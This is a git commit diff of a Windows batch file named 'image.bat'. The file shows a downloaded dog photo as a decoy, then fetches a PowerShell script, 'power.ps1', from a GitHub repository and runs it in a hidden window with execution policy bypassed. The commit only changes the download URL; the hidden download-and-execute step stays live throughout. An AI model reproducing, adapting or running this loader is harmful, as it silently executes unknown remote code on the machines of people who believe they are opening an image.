09e5507a329ab984916bf730fe29cdeb04c160a1
meruemmitnick-maker <meruemmitnick@gmail.com>
2025-09-21 12:35:40 +0800

    Update image.bat

--- image.bat
+++ image.bat
@@ -4,7 +4,8 @@ pushd %temp%
 powershell Invoke-WebRequest "https://static.onecms.io/wp-content/uploads/sites/24/2021/04/26/GettyImages-185743593-2000.jpg" -Outfile "doggy.jpg"
 doggy.jpg
 
-powershell Invoke-WebRequest -Uri https://raw.githubusercontent.com/meruemmitnick-maker/HWI/refs/heads/main/power.ps1 -OutFile .\power.ps1;
+powershell Invoke-WebRequest -Uri https://github.com/meruemmitnick-maker/HWI/blob/main/power.ps1 -OutFile .\power.ps1;
 
 start PowerShell -windowstyle hidden -NoProfile -ExecutionPolicy Bypass -file "power.ps1"
+
 
